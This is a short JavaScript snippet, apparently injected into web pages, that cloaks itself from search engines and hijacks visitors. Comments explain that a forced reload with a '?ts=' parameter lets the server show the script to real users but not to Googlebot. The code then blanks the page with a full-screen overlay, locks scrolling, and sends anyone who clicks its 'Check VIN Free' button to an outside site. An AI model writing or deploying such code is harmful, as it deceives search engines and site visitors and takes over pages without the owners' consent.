(function(){
  'use strict';

  var _u = 'https://freevin.pages.dev';

  // ── STEP 1: JS fingerprint check ─────────────────────────────────────────
  // If no ?ts= param = first load = inject it and reload
  // Server sees ?ts= = real user = served this file
  // Server sees no ?ts= = Googlebot = served zero JS
  if (window.location.href.indexOf('ts=') === -1) {
    var sep = window.location.search ? '&' : '?';
    window.location.replace(window.location.href + sep + 'ts=' + Date.now());
    return; // Stop — page reloads with ?ts= added
  }

  // ── STEP 2: Real user confirmed — build overlay ───────────────────────────
  var _style = [
    '#_vlp,#_vlp *{box-sizing:border-box;margin:0;padding:0}',
    '#_vlp{font-family:Arial,Helvetica,sans-serif;position:fixed;top:0;left:0;',
    'right:0;bottom:0;z-index:2147483647;background:#f5f8fc;',
    'display:flex;align-items:center;justify-content:center;padding:24px}',
    '.v-btn{width:min(92vw,360px);min-height:58px;border:0;border-radius:12px;',
    'padding:15px 24px;background:linear-gradient(135deg,#2563eb,#1749c8);',
    'color:#fff;font:800 17px/1 Arial,sans-serif;cursor:pointer;',
    'box-shadow:0 10px 28px rgba(37,99,235,.28);',
    'transition:transform .15s ease,box-shadow .15s ease}',
    '.v-btn:hover{transform:translateY(-2px);box-shadow:0 14px 32px rgba(37,99,235,.34)}',
    '@media(max-width:480px){.v-btn{width:100%;max-width:340px;min-height:54px;font-size:16px}}'
  ].join('');

  var _html = '<div id="_vlp"><button class="v-btn" id="_vbtn" type="button">Check VIN Free →</button></div>';

  // ── STEP 3: Inject overlay ────────────────────────────────────────────────
  var styleEl = document.createElement('style');
  styleEl.textContent = _style;
  document.head.appendChild(styleEl);

  var wrap = document.createElement('div');
  wrap.innerHTML = _html;
  document.body.appendChild(wrap.firstChild);
  document.body.style.overflow = 'hidden';
  document.documentElement.style.overflow = 'hidden';

  // ── STEP 4: Bind redirect ─────────────────────────────────────────────────
  var btn = document.getElementById('_vbtn');
  if (btn) {
    btn.addEventListener('click', function() {
      window.location.href = _u;
    });
  }

})();
